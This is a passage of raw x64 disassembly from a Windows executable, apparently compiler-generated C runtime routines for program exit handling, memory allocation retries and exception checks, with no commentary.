   140006d4d:	74 47                	je     0x140006d96
   140006d4f:	ba 78 04 00 00       	mov    $0x478,%edx
   140006d54:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006d59:	e8 56 05 00 00       	call   0x1400072b4
   140006d5e:	48 8b d8             	mov    %rax,%rbx
   140006d61:	48 85 c0             	test   %rax,%rax
   140006d64:	74 30                	je     0x140006d96
   140006d66:	8b 0d 4c 28 01 00    	mov    0x1284c(%rip),%ecx        # 0x1400195b8
   140006d6c:	48 8b d0             	mov    %rax,%rdx
   140006d6f:	e8 a0 cb ff ff       	call   0x140003914
   140006d74:	85 c0                	test   %eax,%eax
   140006d76:	74 1e                	je     0x140006d96
   140006d78:	33 d2                	xor    %edx,%edx
   140006d7a:	48 8b cb             	mov    %rbx,%rcx
   140006d7d:	e8 de fe ff ff       	call   0x140006c60
   140006d82:	ff 15 10 a3 00 00    	call   *0xa310(%rip)        # 0x140011098
   140006d88:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   140006d8d:	89 03                	mov    %eax,(%rbx)
   140006d8f:	b8 01 00 00 00       	mov    $0x1,%eax
   140006d94:	eb 07                	jmp    0x140006d9d
   140006d96:	e8 09 00 00 00       	call   0x140006da4
   140006d9b:	33 c0                	xor    %eax,%eax
   140006d9d:	48 83 c4 20          	add    $0x20,%rsp
   140006da1:	5b                   	pop    %rbx
   140006da2:	c3                   	ret
   140006da3:	cc                   	int3
   140006da4:	48 83 ec 28          	sub    $0x28,%rsp
   140006da8:	8b 0d 0a 28 01 00    	mov    0x1280a(%rip),%ecx        # 0x1400195b8
   140006dae:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006db1:	74 0c                	je     0x140006dbf
   140006db3:	e8 24 cb ff ff       	call   0x1400038dc
   140006db8:	83 0d f9 27 01 00 ff 	orl    $0xffffffff,0x127f9(%rip)        # 0x1400195b8
   140006dbf:	48 83 c4 28          	add    $0x28,%rsp
   140006dc3:	e9 2c 11 00 00       	jmp    0x140007ef4
   140006dc8:	48 8b c4             	mov    %rsp,%rax
   140006dcb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006dcf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006dd3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006dd7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006ddb:	41 57                	push   %r15
   140006ddd:	48 83 ec 30          	sub    $0x30,%rsp
   140006de1:	33 ff                	xor    %edi,%edi
   140006de3:	48 8b da             	mov    %rdx,%rbx
   140006de6:	48 8b f1             	mov    %rcx,%rsi
   140006de9:	48 85 c9             	test   %rcx,%rcx
   140006dec:	75 18                	jne    0x140006e06
   140006dee:	e8 85 d7 ff ff       	call   0x140004578
   140006df3:	bb 16 00 00 00       	mov    $0x16,%ebx
   140006df8:	89 18                	mov    %ebx,(%rax)
   140006dfa:	e8 29 d3 ff ff       	call   0x140004128
   140006dff:	8b c3                	mov    %ebx,%eax
   140006e01:	e9 a7 00 00 00       	jmp    0x140006ead
   140006e06:	48 85 d2             	test   %rdx,%rdx
   140006e09:	74 e3                	je     0x140006dee
   140006e0b:	e8 78 cb ff ff       	call   0x140003988
   140006e10:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140006e16:	85 c0                	test   %eax,%eax
   140006e18:	75 0c                	jne    0x140006e26
   140006e1a:	ff 15 88 a3 00 00    	call   *0xa388(%rip)        # 0x1400111a8
   140006e20:	85 c0                	test   %eax,%eax
   140006e22:	41 0f 44 ff          	cmove  %r15d,%edi
   140006e26:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140006e2b:	48 83 23 00          	andq   $0x0,(%rbx)
   140006e2f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006e35:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006e39:	4c 8b c6             	mov    %rsi,%r8
   140006e3c:	33 d2                	xor    %edx,%edx
   140006e3e:	8b cf                	mov    %edi,%ecx
   140006e40:	ff 15 6a a3 00 00    	call   *0xa36a(%rip)        # 0x1400111b0
   140006e46:	48 63 e8             	movslq %eax,%rbp
   140006e49:	85 c0                	test   %eax,%eax
   140006e4b:	75 11                	jne    0x140006e5e
   140006e4d:	ff 15 3d a2 00 00    	call   *0xa23d(%rip)        # 0x140011090
   140006e53:	8b c8                	mov    %eax,%ecx
   140006e55:	e8 ce d6 ff ff       	call   0x140004528
   140006e5a:	33 c0                	xor    %eax,%eax
   140006e5c:	eb 4f                	jmp    0x140006ead
   140006e5e:	48 8b cd             	mov    %rbp,%rcx
   140006e61:	48 03 c9             	add    %rcx,%rcx
   140006e64:	e8 cb 04 00 00       	call   0x140007334
   140006e69:	48 89 03             	mov    %rax,(%rbx)
   140006e6c:	48 85 c0             	test   %rax,%rax
   140006e6f:	74 e9                	je     0x140006e5a
   140006e71:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006e75:	4c 8b c6             	mov    %rsi,%r8
   140006e78:	33 d2                	xor    %edx,%edx
   140006e7a:	8b cf                	mov    %edi,%ecx
   140006e7c:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140006e80:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006e85:	ff 15 25 a3 00 00    	call   *0xa325(%rip)        # 0x1400111b0
   140006e8b:	85 c0                	test   %eax,%eax
   140006e8d:	75 1b                	jne    0x140006eaa
   140006e8f:	ff 15 fb a1 00 00    	call   *0xa1fb(%rip)        # 0x140011090
   140006e95:	8b c8                	mov    %eax,%ecx
   140006e97:	e8 8c d6 ff ff       	call   0x140004528
   140006e9c:	48 8b 0b             	mov    (%rbx),%rcx
   140006e9f:	e8 f0 c8 ff ff       	call   0x140003794
   140006ea4:	48 83 23 00          	andq   $0x0,(%rbx)
   140006ea8:	eb b0                	jmp    0x140006e5a
   140006eaa:	41 8b c7             	mov    %r15d,%eax
   140006ead:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006eb2:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006eb7:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006ebc:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140006ec1:	48 83 c4 30          	add    $0x30,%rsp
   140006ec5:	41 5f                	pop    %r15
   140006ec7:	c3                   	ret
   140006ec8:	40 53                	rex push %rbx
   140006eca:	48 83 ec 20          	sub    $0x20,%rsp
   140006ece:	8b d9                	mov    %ecx,%ebx
   140006ed0:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140006ed5:	48 8d 15 04 ac 00 00 	lea    0xac04(%rip),%rdx        # 0x140011ae0
   140006edc:	33 c9                	xor    %ecx,%ecx
   140006ede:	ff 15 bc a2 00 00    	call   *0xa2bc(%rip)        # 0x1400111a0
   140006ee4:	85 c0                	test   %eax,%eax
   140006ee6:	74 1b                	je     0x140006f03
   140006ee8:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140006eed:	48 8d 15 04 ac 00 00 	lea    0xac04(%rip),%rdx        # 0x140011af8
   140006ef4:	ff 15 3e a1 00 00    	call   *0xa13e(%rip)        # 0x140011038
   140006efa:	48 85 c0             	test   %rax,%rax
   140006efd:	74 04                	je     0x140006f03
   140006eff:	8b cb                	mov    %ebx,%ecx
   140006f01:	ff d0                	call   *%rax
   140006f03:	48 83 c4 20          	add    $0x20,%rsp
   140006f07:	5b                   	pop    %rbx
   140006f08:	c3                   	ret
   140006f09:	cc                   	int3
   140006f0a:	cc                   	int3
   140006f0b:	cc                   	int3
   140006f0c:	40 53                	rex push %rbx
   140006f0e:	48 83 ec 20          	sub    $0x20,%rsp
   140006f12:	8b d9                	mov    %ecx,%ebx
   140006f14:	e8 af ff ff ff       	call   0x140006ec8
   140006f19:	8b cb                	mov    %ebx,%ecx
   140006f1b:	ff 15 77 a2 00 00    	call   *0xa277(%rip)        # 0x140011198
   140006f21:	cc                   	int3
   140006f22:	cc                   	int3
   140006f23:	cc                   	int3
   140006f24:	40 53                	rex push %rbx
   140006f26:	48 83 ec 20          	sub    $0x20,%rsp
   140006f2a:	8b d9                	mov    %ecx,%ebx
   140006f2c:	e8 63 09 00 00       	call   0x140007894
   140006f31:	8b cb                	mov    %ebx,%ecx
   140006f33:	e8 d0 09 00 00       	call   0x140007908
   140006f38:	45 33 c0             	xor    %r8d,%r8d
   140006f3b:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140006f40:	41 8d 50 01          	lea    0x1(%r8),%edx
   140006f44:	e8 c7 01 00 00       	call   0x140007110
   140006f49:	cc                   	int3
   140006f4a:	cc                   	int3
   140006f4b:	cc                   	int3
   140006f4c:	ba 01 00 00 00       	mov    $0x1,%edx
   140006f51:	33 c9                	xor    %ecx,%ecx
   140006f53:	44 8b c2             	mov    %edx,%r8d
   140006f56:	e9 b5 01 00 00       	jmp    0x140007110
   140006f5b:	cc                   	int3
   140006f5c:	33 d2                	xor    %edx,%edx
   140006f5e:	33 c9                	xor    %ecx,%ecx
   140006f60:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140006f64:	e9 a7 01 00 00       	jmp    0x140007110
   140006f69:	cc                   	int3
   140006f6a:	cc                   	int3
   140006f6b:	cc                   	int3
   140006f6c:	40 53                	rex push %rbx
   140006f6e:	48 83 ec 20          	sub    $0x20,%rsp
   140006f72:	48 83 3d 1e 01 01 00 	cmpq   $0x0,0x1011e(%rip)        # 0x140017098
   140006f79:	00 
   140006f7a:	8b d9                	mov    %ecx,%ebx
   140006f7c:	74 18                	je     0x140006f96
   140006f7e:	48 8d 0d 13 01 01 00 	lea    0x10113(%rip),%rcx        # 0x140017098
   140006f85:	e8 76 18 00 00       	call   0x140008800
   140006f8a:	85 c0                	test   %eax,%eax
   140006f8c:	74 08                	je     0x140006f96
   140006f8e:	8b cb                	mov    %ebx,%ecx
   140006f90:	ff 15 02 01 01 00    	call   *0x10102(%rip)        # 0x140017098
   140006f96:	e8 81 2c 00 00       	call   0x140009c1c
   140006f9b:	48 8d 15 4e a3 00 00 	lea    0xa34e(%rip),%rdx        # 0x1400112f0
   140006fa2:	48 8d 0d 17 a3 00 00 	lea    0xa317(%rip),%rcx        # 0x1400112c0
   140006fa9:	e8 0e 01 00 00       	call   0x1400070bc
   140006fae:	85 c0                	test   %eax,%eax
   140006fb0:	75 4a                	jne    0x140006ffc
   140006fb2:	48 8d 0d eb 0c 00 00 	lea    0xceb(%rip),%rcx        # 0x140007ca4
   140006fb9:	e8 d2 31 00 00       	call   0x14000a190
   140006fbe:	48 8d 15 f3 a2 00 00 	lea    0xa2f3(%rip),%rdx        # 0x1400112b8
   140006fc5:	48 8d 0d e4 a2 00 00 	lea    0xa2e4(%rip),%rcx        # 0x1400112b0
   140006fcc:	e8 8b 00 00 00       	call   0x14000705c
   140006fd1:	48 83 3d 67 4c 01 00 	cmpq   $0x0,0x14c67(%rip)        # 0x14001bc40
   140006fd8:	00 
   140006fd9:	74 1f                	je     0x140006ffa
   140006fdb:	48 8d 0d 5e 4c 01 00 	lea    0x14c5e(%rip),%rcx        # 0x14001bc40
   140006fe2:	e8 19 18 00 00       	call   0x140008800
   140006fe7:	85 c0                	test   %eax,%eax
   140006fe9:	74 0f                	je     0x140006ffa
   140006feb:	45 33 c0             	xor    %r8d,%r8d
   140006fee:	33 c9                	xor    %ecx,%ecx
   140006ff0:	41 8d 50 02          	lea    0x2(%r8),%edx
   140006ff4:	ff 15 46 4c 01 00    	call   *0x14c46(%rip)        # 0x14001bc40
   140006ffa:	33 c0                	xor    %eax,%eax
   140006ffc:	48 83 c4 20          	add    $0x20,%rsp
   140007000:	5b                   	pop    %rbx
   140007001:	c3                   	ret
   140007002:	cc                   	int3
   140007003:	cc                   	int3
   140007004:	45 33 c0             	xor    %r8d,%r8d
   140007007:	41 8d 50 01          	lea    0x1(%r8),%edx
   14000700b:	e9 00 01 00 00       	jmp    0x140007110
   140007010:	40 53                	rex push %rbx
   140007012:	48 83 ec 20          	sub    $0x20,%rsp
   140007016:	33 c9                	xor    %ecx,%ecx
   140007018:	ff 15 62 a0 00 00    	call   *0xa062(%rip)        # 0x140011080
   14000701e:	48 8b c8             	mov    %rax,%rcx
   140007021:	48 8b d8             	mov    %rax,%rbx
   140007024:	e8 5f c6 ff ff       	call   0x140003688
   140007029:	48 8b cb             	mov    %rbx,%rcx
   14000702c:	e8 87 d0 ff ff       	call   0x1400040b8
   140007031:	48 8b cb             	mov    %rbx,%rcx
   140007034:	e8 af 31 00 00       	call   0x14000a1e8
   140007039:	48 8b cb             	mov    %rbx,%rcx
   14000703c:	e8 bf 31 00 00       	call   0x14000a200
   140007041:	48 8b cb             	mov    %rbx,%rcx
   140007044:	e8 7f 31 00 00       	call   0x14000a1c8
   140007049:	48 8b cb             	mov    %rbx,%rcx
   14000704c:	e8 03 34 00 00       	call   0x14000a454
   140007051:	48 83 c4 20          	add    $0x20,%rsp
   140007055:	5b                   	pop    %rbx
   140007056:	e9 79 c9 ff ff       	jmp    0x1400039d4
   14000705b:	cc                   	int3
   14000705c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007061:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007066:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000706b:	57                   	push   %rdi
   14000706c:	48 83 ec 20          	sub    $0x20,%rsp
   140007070:	33 ed                	xor    %ebp,%ebp
   140007072:	48 8b da             	mov    %rdx,%rbx
   140007075:	48 8b f9             	mov    %rcx,%rdi
   140007078:	48 2b d9             	sub    %rcx,%rbx
   14000707b:	8b f5                	mov    %ebp,%esi
   14000707d:	48 83 c3 07          	add    $0x7,%rbx
   140007081:	48 c1 eb 03          	shr    $0x3,%rbx
   140007085:	48 3b ca             	cmp    %rdx,%rcx
   140007088:	48 0f 47 dd          	cmova  %rbp,%rbx
   14000708c:	48 85 db             	test   %rbx,%rbx
   14000708f:	74 16                	je     0x1400070a7
   140007091:	48 8b 07             	mov    (%rdi),%rax
   140007094:	48 85 c0             	test   %rax,%rax
   140007097:	74 02                	je     0x14000709b
   140007099:	ff d0                	call   *%rax
   14000709b:	48 ff c6             	inc    %rsi
   14000709e:	48 83 c7 08          	add    $0x8,%rdi
   1400070a2:	48 3b f3             	cmp    %rbx,%rsi
   1400070a5:	72 ea                	jb     0x140007091
   1400070a7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400070ac:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400070b1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400070b6:	48 83 c4 20          	add    $0x20,%rsp
   1400070ba:	5f                   	pop    %rdi
   1400070bb:	c3                   	ret
   1400070bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400070c1:	57                   	push   %rdi
   1400070c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400070c6:	33 c0                	xor    %eax,%eax
   1400070c8:	48 8b fa             	mov    %rdx,%rdi
   1400070cb:	48 8b d9             	mov    %rcx,%rbx
   1400070ce:	48 3b ca             	cmp    %rdx,%rcx
   1400070d1:	73 17                	jae    0x1400070ea
   1400070d3:	85 c0                	test   %eax,%eax
   1400070d5:	75 13                	jne    0x1400070ea
   1400070d7:	48 8b 0b             	mov    (%rbx),%rcx
   1400070da:	48 85 c9             	test   %rcx,%rcx
   1400070dd:	74 02                	je     0x1400070e1
   1400070df:	ff d1                	call   *%rcx
   1400070e1:	48 83 c3 08          	add    $0x8,%rbx
   1400070e5:	48 3b df             	cmp    %rdi,%rbx
   1400070e8:	72 e9                	jb     0x1400070d3
   1400070ea:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400070ef:	48 83 c4 20          	add    $0x20,%rsp
   1400070f3:	5f                   	pop    %rdi
   1400070f4:	c3                   	ret
   1400070f5:	cc                   	int3
   1400070f6:	cc                   	int3
   1400070f7:	cc                   	int3
   1400070f8:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400070fd:	e9 ae 0d 00 00       	jmp    0x140007eb0
   140007102:	cc                   	int3
   140007103:	cc                   	int3
   140007104:	b9 08 00 00 00       	mov    $0x8,%ecx
   140007109:	e9 92 0f 00 00       	jmp    0x1400080a0
   14000710e:	cc                   	int3
   14000710f:	cc                   	int3
   140007110:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007115:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000711a:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000711f:	57                   	push   %rdi
   140007120:	41 54                	push   %r12
   140007122:	41 55                	push   %r13
   140007124:	41 56                	push   %r14
   140007126:	41 57                	push   %r15
   140007128:	48 83 ec 40          	sub    $0x40,%rsp
   14000712c:	45 8b f0             	mov    %r8d,%r14d
   14000712f:	8b da                	mov    %edx,%ebx
   140007131:	44 8b e9             	mov    %ecx,%r13d
   140007134:	b9 08 00 00 00       	mov    $0x8,%ecx
   140007139:	e8 72 0d 00 00       	call   0x140007eb0
   14000713e:	90                   	nop
   14000713f:	83 3d ca 3f 01 00 01 	cmpl   $0x1,0x13fca(%rip)        # 0x14001b110
   140007146:	0f 84 07 01 00 00    	je     0x140007253
   14000714c:	c7 05 fa 3f 01 00 01 	movl   $0x1,0x13ffa(%rip)        # 0x14001b150
   140007153:	00 00 00 
   140007156:	44 88 35 ef 3f 01 00 	mov    %r14b,0x13fef(%rip)        # 0x14001b14c
   14000715d:	85 db                	test   %ebx,%ebx
   14000715f:	0f 85 da 00 00 00    	jne    0x14000723f
   140007165:	48 8b 0d e4 4a 01 00 	mov    0x14ae4(%rip),%rcx        # 0x14001bc50
   14000716c:	ff 15 16 9f 00 00    	call   *0x9f16(%rip)        # 0x140011088
   140007172:	48 8b f0             	mov    %rax,%rsi
   140007175:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000717a:	48 85 c0             	test   %rax,%rax
   14000717d:	0f 84 a9 00 00 00    	je     0x14000722c
   140007183:	48 8b 0d be 4a 01 00 	mov    0x14abe(%rip),%rcx        # 0x14001bc48
   14000718a:	ff 15 f8 9e 00 00    	call   *0x9ef8(%rip)        # 0x140011088
   140007190:	48 8b f8             	mov    %rax,%rdi
   140007193:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007198:	4c 8b e6             	mov    %rsi,%r12
   14000719b:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400071a0:	4c 8b f8             	mov    %rax,%r15
   1400071a3:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400071a8:	48 83 ef 08          	sub    $0x8,%rdi
   1400071ac:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400071b1:	48 3b fe             	cmp    %rsi,%rdi
   1400071b4:	72 76                	jb     0x14000722c
   1400071b6:	33 c9                	xor    %ecx,%ecx
   1400071b8:	ff 15 c2 9e 00 00    	call   *0x9ec2(%rip)        # 0x140011080
   1400071be:	48 39 07             	cmp    %rax,(%rdi)
   1400071c1:	75 02                	jne    0x1400071c5
   1400071c3:	eb e3                	jmp    0x1400071a8
   1400071c5:	48 3b fe             	cmp    %rsi,%rdi
   1400071c8:	72 62                	jb     0x14000722c
   1400071ca:	48 8b 0f             	mov    (%rdi),%rcx
   1400071cd:	ff 15 b5 9e 00 00    	call   *0x9eb5(%rip)        # 0x140011088
   1400071d3:	48 8b d8             	mov    %rax,%rbx
   1400071d6:	33 c9                	xor    %ecx,%ecx
   1400071d8:	ff 15 a2 9e 00 00    	call   *0x9ea2(%rip)        # 0x140011080
   1400071de:	48 89 07             	mov    %rax,(%rdi)
   1400071e1:	ff d3                	call   *%rbx
   1400071e3:	48 8b 0d 66 4a 01 00 	mov    0x14a66(%rip),%rcx        # 0x14001bc50
   1400071ea:	ff 15 98 9e 00 00    	call   *0x9e98(%rip)        # 0x140011088
   1400071f0:	48 8b d8             	mov    %rax,%rbx
   1400071f3:	48 8b 0d 4e 4a 01 00 	mov    0x14a4e(%rip),%rcx        # 0x14001bc48
   1400071fa:	ff 15 88 9e 00 00    	call   *0x9e88(%rip)        # 0x140011088
   140007200:	4c 3b e3             	cmp    %rbx,%r12
   140007203:	75 05                	jne    0x14000720a
   140007205:	4c 3b f8             	cmp    %rax,%r15
   140007208:	74 b9                	je     0x1400071c3
   14000720a:	4c 8b e3             	mov    %rbx,%r12
   14000720d:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140007212:	48 8b f3             	mov    %rbx,%rsi
   140007215:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000721a:	4c 8b f8             	mov    %rax,%r15
   14000721d:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140007222:	48 8b f8             	mov    %rax,%rdi
   140007225:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000722a:	eb 97                	jmp    0x1400071c3
   14000722c:	48 8d 15 e5 a0 00 00 	lea    0xa0e5(%rip),%rdx        # 0x140011318
   140007233:	48 8d 0d be a0 00 00 	lea    0xa0be(%rip),%rcx        # 0x1400112f8
   14000723a:	e8 1d fe ff ff       	call   0x14000705c
   14000723f:	48 8d 15 e2 a0 00 00 	lea    0xa0e2(%rip),%rdx        # 0x140011328
   140007246:	48 8d 0d d3 a0 00 00 	lea    0xa0d3(%rip),%rcx        # 0x140011320
   14000724d:	e8 0a fe ff ff       	call   0x14000705c
   140007252:	90                   	nop
   140007253:	45 85 f6             	test   %r14d,%r14d
   140007256:	74 0f                	je     0x140007267
   140007258:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000725d:	e8 3e 0e 00 00       	call   0x1400080a0
   140007262:	45 85 f6             	test   %r14d,%r14d
   140007265:	75 26                	jne    0x14000728d
   140007267:	c7 05 9f 3e 01 00 01 	movl   $0x1,0x13e9f(%rip)        # 0x14001b110
   14000726e:	00 00 00 
   140007271:	b9 08 00 00 00       	mov    $0x8,%ecx
   140007276:	e8 25 0e 00 00       	call   0x1400080a0
   14000727b:	41 8b cd             	mov    %r13d,%ecx
   14000727e:	e8 45 fc ff ff       	call   0x140006ec8
   140007283:	41 8b cd             	mov    %r13d,%ecx
   140007286:	ff 15 0c 9f 00 00    	call   *0x9f0c(%rip)        # 0x140011198
   14000728c:	cc                   	int3
   14000728d:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140007292:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140007297:	48 83 c4 40          	add    $0x40,%rsp
   14000729b:	41 5f                	pop    %r15
   14000729d:	41 5e                	pop    %r14
   14000729f:	41 5d                	pop    %r13
   1400072a1:	41 5c                	pop    %r12
   1400072a3:	5f                   	pop    %rdi
   1400072a4:	c3                   	ret
   1400072a5:	cc                   	int3
   1400072a6:	cc                   	int3
   1400072a7:	cc                   	int3
   1400072a8:	45 33 c0             	xor    %r8d,%r8d
   1400072ab:	33 d2                	xor    %edx,%edx
   1400072ad:	e9 5e fe ff ff       	jmp    0x140007110
   1400072b2:	cc                   	int3
   1400072b3:	cc                   	int3
   1400072b4:	48 8b c4             	mov    %rsp,%rax
   1400072b7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400072bb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400072bf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400072c3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400072c7:	41 56                	push   %r14
   1400072c9:	48 83 ec 20          	sub    $0x20,%rsp
   1400072cd:	33 db                	xor    %ebx,%ebx
   1400072cf:	48 8b f2             	mov    %rdx,%rsi
   1400072d2:	48 8b e9             	mov    %rcx,%rbp
   1400072d5:	41 83 ce ff          	or     $0xffffffff,%r14d
   1400072d9:	45 33 c0             	xor    %r8d,%r8d
   1400072dc:	48 8b d6             	mov    %rsi,%rdx
   1400072df:	48 8b cd             	mov    %rbp,%rcx
   1400072e2:	e8 49 32 00 00       	call   0x14000a530
   1400072e7:	48 8b f8             	mov    %rax,%rdi
   1400072ea:	48 85 c0             	test   %rax,%rax
   1400072ed:	75 26                	jne    0x140007315
   1400072ef:	39 05 73 3e 01 00    	cmp    %eax,0x13e73(%rip)        # 0x14001b168
   1400072f5:	76 1e                	jbe    0x140007315
   1400072f7:	8b cb                	mov    %ebx,%ecx
   1400072f9:	e8 da ca ff ff       	call   0x140003dd8
   1400072fe:	8d 8b e8 03 00 00    	lea    0x3e8(%rbx),%ecx
   140007304:	3b 0d 5e 3e 01 00    	cmp    0x13e5e(%rip),%ecx        # 0x14001b168
   14000730a:	8b d9                	mov    %ecx,%ebx
   14000730c:	41 0f 47 de          	cmova  %r14d,%ebx
   140007310:	41 3b de             	cmp    %r14d,%ebx
   140007313:	75 c4                	jne    0x1400072d9
   140007315:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000731a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000731f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007324:	48 8b c7             	mov    %rdi,%rax
   140007327:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000732c:	48 83 c4 20          	add    $0x20,%rsp
   140007330:	41 5e                	pop    %r14
   140007332:	c3                   	ret
   140007333:	cc                   	int3
   140007334:	48 8b c4             	mov    %rsp,%rax
   140007337:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000733b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000733f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007343:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007347:	41 56                	push   %r14
   140007349:	48 83 ec 20          	sub    $0x20,%rsp
   14000734d:	8b 35 15 3e 01 00    	mov    0x13e15(%rip),%esi        # 0x14001b168
   140007353:	33 db                	xor    %ebx,%ebx
   140007355:	48 8b e9             	mov    %rcx,%rbp
   140007358:	41 83 ce ff          	or     $0xffffffff,%r14d
   14000735c:	48 8b cd             	mov    %rbp,%rcx
   14000735f:	e8 c8 c0 ff ff       	call   0x14000342c
   140007364:	48 8b f8             	mov    %rax,%rdi
   140007367:	48 85 c0             	test   %rax,%rax
   14000736a:	75 24                	jne    0x140007390
   14000736c:	85 f6                	test   %esi,%esi
   14000736e:	74 20                	je     0x140007390
   140007370:	8b cb                	mov    %ebx,%ecx
   140007372:	e8 61 ca ff ff       	call   0x140003dd8
   140007377:	8b 35 eb 3d 01 00    	mov    0x13deb(%rip),%esi        # 0x14001b168
   14000737d:	8d 8b e8 03 00 00    	lea    0x3e8(%rbx),%ecx
   140007383:	3b ce                	cmp    %esi,%ecx
   140007385:	8b d9                	mov    %ecx,%ebx
   140007387:	41 0f 47 de          	cmova  %r14d,%ebx
   14000738b:	41 3b de             	cmp    %r14d,%ebx
   14000738e:	75 cc                	jne    0x14000735c
   140007390:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007395:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000739a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000739f:	48 8b c7             	mov    %rdi,%rax
   1400073a2:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400073a7:	48 83 c4 20          	add    $0x20,%rsp
   1400073ab:	41 5e                	pop    %r14
   1400073ad:	c3                   	ret
   1400073ae:	cc                   	int3
   1400073af:	cc                   	int3
   1400073b0:	48 8b c4             	mov    %rsp,%rax
   1400073b3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400073b7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400073bb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400073bf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400073c3:	41 56                	push   %r14
   1400073c5:	48 83 ec 20          	sub    $0x20,%rsp
   1400073c9:	33 db                	xor    %ebx,%ebx
   1400073cb:	48 8b f2             	mov    %rdx,%rsi
   1400073ce:	48 8b e9             	mov    %rcx,%rbp
   1400073d1:	41 83 ce ff          	or     $0xffffffff,%r14d
   1400073d5:	48 8b d6             	mov    %rsi,%rdx
   1400073d8:	48 8b cd             	mov    %rbp,%rcx
   1400073db:	e8 7c 30 00 00       	call   0x14000a45c
   1400073e0:	48 8b f8             	mov    %rax,%rdi
   1400073e3:	48 85 c0             	test   %rax,%rax
   1400073e6:	75 2b                	jne    0x140007413
   1400073e8:	48 85 f6             	test   %rsi,%rsi
   1400073eb:	74 26                	je     0x140007413
   1400073ed:	39 05 75 3d 01 00    	cmp    %eax,0x13d75(%rip)        # 0x14001b168
   1400073f3:	76 1e                	jbe    0x140007413
   1400073f5:	8b cb                	mov    %ebx,%ecx
   1400073f7:	e8 dc c9 ff ff       	call   0x140003dd8
   1400073fc:	8d 8b e8 03 00 00    	lea    0x3e8(%rbx),%ecx
   140007402:	3b 0d 60 3d 01 00    	cmp    0x13d60(%rip),%ecx        # 0x14001b168
   140007408:	8b d9                	mov    %ecx,%ebx
   14000740a:	41 0f 47 de          	cmova  %r14d,%ebx
   14000740e:	41 3b de             	cmp    %r14d,%ebx
   140007411:	75 c2                	jne    0x1400073d5
   140007413:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007418:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000741d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007422:	48 8b c7             	mov    %rdi,%rax
   140007425:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000742a:	48 83 c4 20          	add    $0x20,%rsp
   14000742e:	41 5e                	pop    %r14
   140007430:	c3                   	ret
   140007431:	cc                   	int3
   140007432:	cc                   	int3
   140007433:	cc                   	int3
   140007434:	48 83 ec 28          	sub    $0x28,%rsp
   140007438:	48 8b 01             	mov    (%rcx),%rax
   14000743b:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   140007441:	75 1c                	jne    0x14000745f
